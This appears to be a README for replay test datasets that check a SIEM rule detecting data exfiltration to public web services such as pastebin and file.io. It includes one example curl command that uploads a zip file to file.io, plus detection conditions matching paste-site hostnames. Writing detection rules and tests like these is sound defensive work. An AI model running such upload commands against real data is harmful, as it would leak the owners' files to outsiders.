# 4dc4c888-7aee-4709-b9a5-25988a1721c2 — golden replay datasets

`Exfiltration - Data Upload to Public Web Service (AN1511)`

Generated from the live rule on `siem.correlation.rules`. Every event is derived
from this rule's own IR — conditions, aggregate threshold, window and stage
timings — and every dataset was replayed through the production deserializer and
the production-parity rule dispatcher before being written. See `proof.md`.

## Technique Breakdown: T1567

* What it is: Exfiltration Over Web Service. Adversaries exfiltrate stolen data by posting it to public web services (such as pastebins, temporary file-sharing portals, or API endpoints of online utilities) rather than standard cloud storage. They configure scripting engines (like PowerShell) or file-transfer binaries (like `curl.exe`) to execute HTTP POST requests targeting these services. Since these web services are legitimate, their outbound traffic is often allowed through corporate firewalls.
* Log Source Requirements: Sysmon Network Connection logs (Event ID 3) and Process Creation logs (Event ID 1) capturing web request parameters.
* Coverage Check:
    * HIDS (Sysmon + Wazuh): YES. Sysmon Event ID 3 logs the destination hostname of network sockets initiated by scripting utilities. Event ID 1 captures command line details (e.g. `curl -F "file=@data.zip" https://file.io`).
    * NIDS (Suricata + Zeek): YES. Network monitoring records SSL SNI negotiations or HTTP requests to public paste/file sharing domains.

## Blind Spots & Tuning

- Authorized IT administration activities.
- Tune with allowlists for known trusted execution paths.

## Files

| File | Expected alerts | Why |
|---|---|---|
| `true_positive_1.jsonl` | 1 | THRESHOLD: stage 0 × 1 event(s) |
| `true_positive_2.jsonl` | 1 | THRESHOLD: stage 0 × 1 event(s) |
| `benign_1.jsonl` | 0 | near-miss value for 'cmd_line contains pastebin' — every other condition holds, so the stage gate rejects the events |
| `benign_2.jsonl` | 0 | near-miss value for 'dst_hostname contains pastebin.com' — every other condition holds, so the stage gate rejects the events |

## Replaying

These datasets must be replayed onto **`replay-events-sysmon`**.
The topic name is not cosmetic: `NormalizedEventDeserializer` selects its parser
from the topic, and `inferSourceFromTopic` derives `NormalizedEvent.source` — the
value `rule.isApplicableTo` gates on. Replayed onto a topic that resolves to a
different source, this rule cannot fire at all.

```
replay --file true_positive_1.jsonl --topic replay-events-sysmon
```

## Determinism

Timestamps anchor at a fixed origin (`2026-03-02T09:00:00.000Z`), identities derive from the rule id, and event uids are content-derived.
Regenerating from an unchanged rule reproduces these files byte for byte.
